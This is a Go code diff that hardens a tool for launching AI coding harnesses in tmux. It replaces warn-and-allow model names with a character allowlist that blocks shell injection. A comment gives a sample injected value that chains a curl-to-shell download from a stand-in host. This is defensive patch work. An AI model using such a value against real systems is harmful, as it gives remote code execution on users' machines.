@@ -106,9 +106,35 @@ var HarnessModelFlag = map[string]string{
 	// opencode-cli uses config/env var, not a CLI flag
 }
 
-// ValidateModel checks if a model alias is known for the given harness.
-// Returns nil if known. Prints a warning (but does NOT error) if unknown,
-// allowing forward compatibility with newly released models.
+// modelCharOK reports whether r is a character allowed inside a model
+// identifier (alias or full name). Real Claude/Gemini model strings are
+// purely [A-Za-z0-9._-/:], and we use this allowlist as a hard gate
+// because the resolved value flows unquoted into shell command strings
+// that are pasted into tmux panes (see buildClaudeCommand,
+// startGeminiDirect, etc.). Allowing anything outside this set would
+// re-open the RCE that motivated this check.
+func modelCharOK(r rune) bool {
+	switch {
+	case r >= 'a' && r <= 'z':
+		return true
+	case r >= 'A' && r <= 'Z':
+		return true
+	case r >= '0' && r <= '9':
+		return true
+	case r == '.' || r == '_' || r == '-' || r == '/' || r == ':':
+		return true
+	}
+	return false
+}
+
+// ValidateModel checks that a model alias is safe to pass to a harness.
+// A registered alias always passes; otherwise the alias must consist solely
+// of model-identifier characters (alphanumeric plus `._-/:`). Anything else
+// is rejected because the resolved string is interpolated unquoted into
+// shell commands sent to tmux panes — a passthrough value like
+// `sonnet; curl evil|sh; #` would otherwise produce an RCE primitive
+// reachable from CLI flags, AGM_DEFAULT_MODEL, or any automation that sets
+// these from untrusted input.
 func ValidateModel(harnessName, modelAlias string) error {
 	models := GetModelsForHarness(harnessName)
 	for _, m := range models {
@@ -116,7 +142,15 @@ func ValidateModel(harnessName, modelAlias string) error {
 			return nil
 		}
 	}
-	// Unknown model: warn but allow
+	if modelAlias == "" {
+		return fmt.Errorf("model is empty")
+	}
+	for _, r := range modelAlias {
+		if !modelCharOK(r) {
+			return fmt.Errorf("model %q contains disallowed character %q (allowed set: alphanumeric and dot underscore dash slash colon)", modelAlias, r)
+		}
+	}
+	// Unknown but syntactically safe: warn and allow (forward-compat).
 	fmt.Fprintf(os.Stderr, "Warning: model '%s' not in registry for harness '%s'. Passing through as-is.\n", modelAlias, harnessName)
 	return nil
 }
@@ -125,10 +159,17 @@ func ValidateModel(harnessName, modelAlias string) error {
 // If the alias is not found natively, checks CrossHarnessAliases for a mapping
 // from another harness's tier name (e.g., "opus" → "2.5-pro" for gemini-cli).
 // If still not found, returns the input as-is (passthrough for unknown models).
+//
+// Defense in depth: the passthrough branch is the one a CLI flag value
+// reaches when the user names a model not in the registry. Callers
+// interpolate the result unquoted into shell commands, so a passthrough
+// value containing shell metacharacters would be RCE. We re-run the
+// character allowlist here so a caller that forgot to call ValidateModel
+// still can't smuggle a payload through.
 func ResolveModelFullName(harnessName, aliasOrFull string) string {
 	models, ok := HarnessModels[harnessName]
 	if !ok {
-		return aliasOrFull
+		return safeModelPassthrough(aliasOrFull)
 	}
 	for _, m := range models {
 		if m.Alias == aliasOrFull {
@@ -146,11 +187,28 @@ func ResolveModelFullName(harnessName, aliasOrFull string) string {
 					return m.FullName
 				}
 			}
-			return mapped // mapped alias not in models (shouldn't happen)
+			return safeModelPassthrough(mapped) // mapped alias not in models (shouldn't happen)
 		}
 	}
 
-	return aliasOrFull // passthrough
+	return safeModelPassthrough(aliasOrFull)
+}
+
+// safeModelPassthrough returns the input only if it is a syntactically safe
+// model identifier; otherwise it replaces it with an empty string and logs
+// the rejection. Empty causes the harness invocation to surface a clear
+// error rather than expanding into a shell injection.
+func safeModelPassthrough(s string) string {
+	if s == "" {
+		return ""
+	}
+	for _, r := range s {
+		if !modelCharOK(r) {
+			fmt.Fprintf(os.Stderr, "ResolveModelFullName: refusing to pass through unsafe model %q (character %q not allowed)\n", s, r)
+			return ""
+		}
+	}
+	return s
 }
 
 // GetModelsForHarness returns known models for a harness.
